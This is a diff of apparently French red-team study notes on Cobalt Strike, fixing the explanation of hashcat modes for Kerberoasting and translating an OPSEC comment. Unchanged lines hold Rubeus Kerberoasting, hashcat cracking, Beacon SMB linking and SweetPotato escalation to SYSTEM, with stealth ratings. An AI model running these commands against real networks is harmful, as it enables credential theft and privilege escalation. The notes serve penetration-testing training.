@@ -35,11 +35,7 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:
 hashcat -a 0 -m 13100 /media/skippypeanut/2tb-hiksemi/hashcat-cracking/cred-acc-challenge.hash ../wordlists/rockyou.txt
 ```
 
-> **Erreur fréquente :** le mode `18200` correspond à l’AS-REP Roasting (`$krb5asrep
-
-> ). Pour le hash Kerberoasting `$krb5tgs
-
->  de cet exemple, utiliser `13100`. Un mauvais mode peut produire `Separator unmatched / No hashes loaded`.
+> **Erreur fréquente :** le mode `18200` correspond à l’AS-REP Roasting (préfixe `$krb5asrep$`). Un hash Kerberoasting porte le préfixe `$krb5tgs$` ; pour le type utilisé ici, sélectionner le mode `13100`. Un mode incorrect peut provoquer `Separator unmatched / No hashes loaded`.
 
 | Mode | Attaque | Préfixe du hash | Commande Rubeus |
 |------|--------|-------------|----------------|
@@ -117,7 +113,7 @@ beacon> link lon-db-1 <SMB-PIPENAME>                          // OPSEC-🟢SAFE 
 ```cs
 // SweetPotato : le payload tcp-local EXE doit déjà être présent sur l’hôte SQL
 beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
-//                                                            // OPSEC-🟠CAUTION — fork & run (execute-assembly spawns spawnto process)
+//                                                            // OPSEC-🟠CAUTION — fork & run : execute-assembly lance le processus spawnto
 beacon> connect localhost 1337                                // OPSEC-🟢SAFE — connexion TCP au Beacon SYSTEM sans nouveau processus
 ```
 
